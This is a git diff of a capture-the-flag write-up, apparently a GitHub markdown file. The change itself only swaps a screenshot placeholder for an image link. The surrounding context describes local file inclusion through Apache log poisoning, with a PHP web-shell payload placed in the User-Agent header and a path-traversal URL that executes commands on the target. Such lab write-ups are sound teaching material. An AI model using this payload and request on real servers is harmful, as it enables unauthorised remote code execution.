@@ -101,7 +101,8 @@ One common method to exploit LFI vulnerabilities is log poisonning. For this, we
 - Log file location : `/var/log/apache2/access.log`
 - User Agent : `<h1><?php system($_GET['cmd']); ?></h1>`
 - Result when visiting `http://<machine_ip>/?view=cats/../../../../var/log/apache2/access.log&ext=&cmd=id`
-<screenshot>
+![Screenshot_2023-12-08_20_29_42](https://github.com/elomarii/CTF_4_DAY/assets/106914699/62233aba-1ee3-4977-9435-09672e19054a)
+
 
 Now that we can execute commands on the target machine, let's discover files there.\
 We find the second flag on the parent folder of where the app lives (execute command `ls ..`).
